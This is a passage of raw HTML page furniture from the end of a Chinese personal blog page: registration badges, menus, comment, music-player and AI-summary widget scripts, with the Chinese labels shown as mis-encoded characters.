data-lazy-src="https://img.shields.io/badge/%E9%84%82ICP%E5%A4%87-2023029632%E5%8F%B7--1-e1d492?style=flat&amp;logo=data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkRFRDAzMDFGQTRERjExRTdBOERFRDM3QzM0QkNFNDU4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkRFRDAzMDIwQTRERjExRTdBOERFRDM3QzM0QkNFNDU4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6REVEMDMwMURBNERGMTFFN0E4REVEMzdDMzRCQ0U0NTgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6REVEMDMwMUVBNERGMTFFN0E4REVEMzdDMzRCQ0U0NTgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7byXusAAAK8ElEQVR42uRXeXAUVRr/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" title="æœ¬ç«™å·²é€šè¿‡å·¥ä¿¡éƒ¨ ICP å¤‡æ¡ˆ"></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E8%90%8CICP%E5%A4%87-20240052%E5%8F%B7-fe1384?style-flat&amp;logo=data:image/png;base64,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" title="æœ¬ç«™å·²é€šè¿‡èŒå¤‡å¤‡æ¡ˆ"></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="go-down" type="button" title="åˆ·æ–°é¡µé¢" onclick="window.location.reload()"><i class="fa-solid fa-arrows-rotate"></i></button><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fa-solid fa-book-open-reader"></i></button><button id="translateLink" type="button" title="ç¹ç®€åˆ‡æ¢">ç¹</button><button id="darkmode" type="button" title="æ˜¼å¤œåˆ‡æ¢"><i class="fa-solid fa-moon"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fa fa-comments"></i></a><button id="go-down" type="button" title="åˆ†äº«æœ¬é¡µ" onclick="rmf.copyWordsLink()"><i class="fa-solid fa-share-from-square"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="ç›´è¾¾åº•éƒ¨" onclick="btf.scrollToDest(document.body.scrollHeight,500)"><i class="fas fa-arrow-down"></i></button></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:btf.scrollToDest(0, 500)"><i class="fa fa-arrow-up"></i></a><a class="rightMenu-item" href="javascript:btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" href="/archives/"><i class="fa-solid fa-calendar-days"></i><span>æ–‡ç« å½’æ¡£</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="fas fa-tags"></i><span>æ–‡ç« æ ‡ç­¾</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="fas fa-folder-open"></i><span>æ–‡ç« åˆ†ç±»</span></a><a class="rightMenu-item" href="javascript:toRandomPost()"><i class="fa fa-paper-plane"></i><span>éšä¾¿é€›é€›</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>å¤åˆ¶</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.bing.com/search?q=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa-brands fa-edge"></i><span>ç”¨Bingæœç´¢</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>ç²˜è´´</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fa fa-comments"></i><span>ç›´è¾¾è¯„è®º</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>å¤åˆ¶æœ¬æ–‡åœ°å€</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>ä¿å­˜å›¾ç‰‡</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>åœ¨æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" href="javascript:rmf.click()"><i class="fa fa-arrows-alt"></i><span>å…¨å±æ˜¾ç¤º</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶å›¾ç‰‡é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:rmf.switchDarkMode();"><i class="fa fa-moon"></i><span>æ˜¼å¤œåˆ‡æ¢</span></a><a class="rightMenu-item" href="javascript:rmf.translate();"><i class="fa-solid fa-earth-asia"></i><span>ç¹ç®€åˆ‡æ¢</span></a><a class="rightMenu-item" href="javascript:rmf.switchReadMode();"><i class="fa-solid fa-book-open-reader"></i><span>é˜…è¯»æ¨¡å¼</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>å…¨å±æ¨¡å¼</span></a><a class="rightMenu-item menu-link" href="/copyright/"><i class="fa-solid fa-copyright"></i><span>æœ¬ç«™åè®®</span></a><a class="rightMenu-item menu-link" href="/about/"><i class="fa-regular fa-address-card"></i><span>å…³äºæœ¬ç«™</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn(){"object"==typeof pangu?pangu.autoSpacingPage():getScript("https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js").then((()=>{pangu.autoSpacingPage()}))}function panguInit(){GLOBAL_CONFIG_SITE.isPost&&panguFn()}document.addEventListener("DOMContentLoaded",panguInit)</script><div class="js-pjax"><script>function loadWaline(){function e(){Waline.init(Object.assign({el:"#waline-wrap",reaction:!0,serverURL:"https://waline.uf4te.cn",pageview:!0,dark:'html[data-theme="dark"]',path:window.location.pathname,comment:!0,reaction:["https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_wink.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_blush.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_think.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_awkward.png","https://unpkg.com/@waline/emojis@1.1.0/weibo/weibo_watermalon.png"]},{locale:{nick:"æ˜µç§° (é€‰å¡«)",mail:"é‚®ç®± (å»ºè®®å¡«å†™)",link:"ä½ çš„ä¸»é¡µ (é€‰å¡«)",placeholder:"è¯·æ–‡æ˜å‘è¨€ï¼Œç‰¢è®°ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼ï¼ˆä¸è¾“å…¥æ˜µç§°å’Œé‚®ç®±å¯ä»¥åŒ¿åè¯„è®ºï¼Œä½†å»ºè®®å¡«å†™é‚®ç®±ç”¨æ¥æ¥æ”¶é‚®ä»¶ç³»ç»Ÿçš„å›å¤æé†’ï¼Œé‚®ç®±ä¿¡æ¯ä¸ä¼šè¢«å…¬å¼€ï¼‰",requiredMeta:[],sofa:"æœ‰ä»€ä¹ˆæƒ³è¯´çš„ï¼Ÿå¿«æ¥å‘è¡¨è¯„è®ºæŠ¢æ²™å‘å§ï¼",login:"ç™»å½• (å¯é€‰)",anonymous:"æŸä¸çŸ¥åç½‘å‹",level0:"æ½œæ°´",level1:"å†’æ³¡",level2:"åæ§½",level3:"æ´»è·ƒ",level4:"è¯ç—¨",level5:"ä¼ è¯´",reactionTitle:"æ„Ÿè§‰æ€ä¹ˆæ ·ï¼Œè¯„ä»·ä¸€ä¸‹ï¼Ÿ",reaction0:"æ„Ÿè§‰å¾ˆèµ",reaction1:"æ”¯æŒä¸€ä¸‹",reaction2:"æ„Ÿè§‰ä¸€èˆ¬",reaction3:"å‹‰å‹‰å¼ºå¼º",reaction4:"è·¯è¿‡åƒç“œ"}}))}const n=document.getElementById("waline-css");"object"==typeof Waline?n?e():getCSS("/css/waline.css","waline-css").then(e):getCSS("/css/waline.css","waline-css").then((()=>{getScript("/js/waline.js").then(e)}))}{function loadOtherComment(){loadWaline()}setTimeout(loadWaline,0)}</script></div><script>window.addEventListener("load",(()=>{const e=e=>{let t="";if(e.length)for(let n=0;n<e.length;n++){t+="<div class='aside-list-item'>";{const a="data-lazy-src";t+=`<a href='${e[n].url}' class='thumbnail'><img ${a}='${e[n].avatar}' alt='${e[n].nick}'></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[n].url}' title='${e[n].content}'>${e[n].content}</a>\n        <div class='name'><span>${e[n].nick} / </span><time datetime="${e[n].date}">${btf.diffDate(e[n].date,!0)}</time></div>\n        </div></div>`}else t+="æ²¡æœ‰è¯„è®º";let n=document.querySelector("#card-newest-comments .aside-list");n.innerHTML=t,window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(n)},t=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const t=saveToLocal.get("waline-newest-comments");t?e(JSON.parse(t)):(()=>{const t=()=>{Waline.RecentComments({serverURL:"https://waline.uf4te.cn",count:15}).then((({comments:t})=>{let n=t.filter((e=>"uf4te"!==e.nick));n.length<5&&(n=n.concat(t.filter((e=>"uf4te"===e.nick)).slice(0,5-n.length)));const a=n.slice(0,5).map((e=>{return{content:(t=e.comment,""===t||(t=(t=(t=(t=t.replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[å›¾ç‰‡]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[é“¾æ¥]")).replace(/<pre><code>.*?<\/pre>/gi,"[ä»£ç ]")).replace(/<[^>]+>/g,"")).length>150&&(t=t.substring(0,150)+"..."),t),avatar:e.avatar,nick:e.nick,url:e.url+"#"+e.objectId,date:e.insertedAt};var t}));saveToLocal.set("waline-newest-comments",JSON.stringify(a),10/1440),e(a)})).catch((e=>{document.querySelector("#card-newest-comments .aside-list").innerHTML="æ— æ³•è·å–è¯„è®ºï¼Œè¯·ç¡®è®¤ç›¸å…³é…ç½®æ˜¯å¦æ­£ç¡®"}))};"object"==typeof Waline?t():getScript("/js/waline.js").then(t)})()}};t(),document.addEventListener("pjax:complete",t)}))</script><script src="/js/jquery.min.js"></script><script src="/js/sakura.js"></script><script data-pjax src="/js/footer_beautification.js"></script><canvas id="universe"></canvas><script src="/js/universe.js"></script><script src="/js/title.js"></script><script async data-pjax src="/js/fps.js"></script><script async data-pjax src="/js/txmap.js"></script><script src="/js/console.js"></script><script src="/js/hotsearch.js"></script><div class="aplayer no-destroy" data-id="8252365535" data-server="netease" data-type="playlist" data-order="random" data-fixed="true" data-autoplay="false" data-theme="#00C4B6" data-volume="0.8" data-mutex="true" data-listmaxheight="330px"></div><script src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script async data-pjax src="/js/timing.js"></script><script data-pjax src="/js/rightmenu.js"></script><script src="/js/random.js"></script><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js"></script><script data-pjax src="/js/poem.js"></script><script src="/js/chuckle-post-ai.js"></script><script data-pjax defer>new ChucklePostAI({el:"#post>#article-container",key:"e3524467cea76d785e9a",title_el:".post-title",interface:{name:"uf4te çš„ AI å°åŠ©æ‰‹",introduce:"Heyï¼Œä½ å¥½ï¼å¾ˆé«˜å…´è§åˆ°ä½ ï¼æˆ‘æ˜¯ uf4te çš„æ–‡ç« è¾…åŠ© AIï¼Œç‚¹å‡»ä¸‹æ–¹çš„æŒ‰é’®ï¼Œæˆ‘å¯ä»¥ä¸ºä½ ç”Ÿæˆæœ¬æ–‡æ‘˜è¦ã€æ¨èç›¸å…³æ–‡ç« ï¼ˆé¦–æ¬¡ç”Ÿæˆå¯èƒ½ä¼šæ¯”è¾ƒæ…¢ï¼Œè¯·æ‚¨è€å¿ƒç­‰å¾…ä¸€å°ä¼šï¼Œè°¢è°¢ç†è§£å“¦~ï¼‰",version:"GPT-3.5",button:["ä»‹ç»è‡ªå·±","æ¨èç›¸å…³æ–‡ç« ","ç”Ÿæˆæœ¬æ–‡æ‘˜è¦","çŸ©é˜µç©¿æ¢­"]},hide_shuttle:!0,pjax:!0,summary_toggle:!1,summary_speech:!0})</script><script data-pjax src="/js/random-friends-post.js"></script><script data-pjax src="/js/pagination.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="â™¡å¯Œå¼ºâ™¡,â™¡æ°‘ä¸»â™¡,â™¡æ–‡æ˜â™¡,â™¡å’Œè°â™¡,â™¡è‡ªç”±â™¡,â™¡å¹³ç­‰â™¡,â™¡å…¬æ­£â™¡,â™¡æ³•æ²»â™¡,â™¡çˆ±å›½â™¡,â™¡æ•¬ä¸šâ™¡,â™¡è¯šä¿¡â™¡,â™¡å‹å–„â™¡" data-fontsize="16px" data-random="false" async></script><link rel="stylesheet" href="/js/APlayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="/js/APlayer/APlayer.min.js"></script><script src="/js/APlayer/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors=["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!1,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.tocScrollFn&&window.removeEventListener("scroll",window.tocScrollFn),window.scrollCollect&&window.removeEventListener("scroll",scrollCollect),document.getElementById("rightside").style.cssText="opacity: ''; transform: 